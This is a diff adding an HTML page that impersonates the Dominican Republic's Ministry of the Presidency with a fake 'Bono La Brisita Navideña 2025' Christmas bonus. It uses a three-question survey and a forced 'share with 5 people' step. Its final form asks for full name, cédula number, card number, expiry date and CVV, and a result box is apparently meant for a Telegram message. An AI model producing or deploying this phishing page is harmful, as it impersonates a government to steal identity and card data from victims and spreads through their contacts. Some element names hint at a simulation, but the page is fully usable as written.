@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bono La Brisita Navideña 2025</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="alert-warning">
+        ⚠️ NO PROPORCIONE SUS DATOS A PERSONAS, SOLO EN LA WEB
+    </div>
+
+    <header>
+        <div class="logo-container">
+            <div class="fake-logo">PRESIDENCIA RD</div>
+            <span>MINISTERIO DE LA PRESIDENCIA</span>
+        </div>
+    </header>
+
+    <main>
+        <section class="intro">
+            <h1>🎉 BONO LA BRISITA NAVIDEÑA</h1>
+            <p>Responda las 3 preguntas y comparta con 5 personas para continuar.</p>
+        </section>
+
+        <section id="form-section" class="form-container">
+            <!-- Pregunta 1 -->
+            <div id="question-1" class="question active">
+                <h3>Pregunta 1 de 3:</h3>
+                <p>¿Cuál es su situación laboral?</p>
+                <button class="option-btn">Estudiante</button>
+                <button class="option-btn">Empleada</button>
+                <button class="option-btn">Desempleada</button>
+            </div>
+
+            <!-- Pregunta 2 -->
+            <div id="question-2" class="question hidden">
+                <h3>Pregunta 2 de 3:</h3>
+                <p>¿Cuál es su estado civil?</p>
+                <button class="option-btn">Casado/a</button>
+                <button class="option-btn">Soltero/a</button>
+                <button class="option-btn">Divorciado/a</button>
+            </div>
+
+            <!-- Pregunta 3 -->
+            <div id="question-3" class="question hidden">
+                <h3>Pregunta 3 de 3:</h3>
+                <p>¿Elige tu rango de edad?</p>
+                <button class="option-btn">18-30</button>
+                <button class="option-btn">30-40</button>
+                <button class="option-btn">40-70</button>
+            </div>
+
+            <!-- Sección de compartir -->
+            <div id="share-section" class="hidden">
+                <h3>📲 ¡Comparte con 5 personas!</h3>
+                <p>Usa el botón de abajo para compartir este enlace.</p>
+                <button id="share-btn" class="btn-share">Compartir enlace</button>
+                
+                <div class="share-progress">
+                    <div class="progress-fill" style="width: 0%"></div>
+                </div>
+                <p>Compartido: <span id="share-count">0</span> de 5</p>
+                
+                <button id="receive-bonus" class="btn-receive" disabled>Continuar</button>
+            </div>
+
+            <!-- Formulario final -->
+            <div id="data-form" class="hidden">
+                <h3>Datos Necesarios (No compartir con extraños)</h3>
+                <input type="text" id="nombre" placeholder="Nombre completo">
+                <input type="text" id="cedula" placeholder="Cédula (ej: 001-0000000-0)">
+                <input type="number" id="edad" placeholder="Edad">
+                <input type="text" id="Número de tarjeta" placeholder="Número de tarjeta">
+                <input type="text" id="vencimiento" placeholder="Vencimiento (MM/AA)">
+                <input type="text" id="ccv" placeholder="CCV (Código de seguridad)">
+                <button id="submit-data" class="btn-submit">Enviar</button>
+            </div>
+
+            <!-- Resultado -->
+            <div id="simulation-output" class="hidden">
+                <h3>Esperar de 24 a 48 horas laborales:</h3>
+                <pre id="telegram-message" class="telegram-box"></pre>
+            </div>
+        </section>
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html>
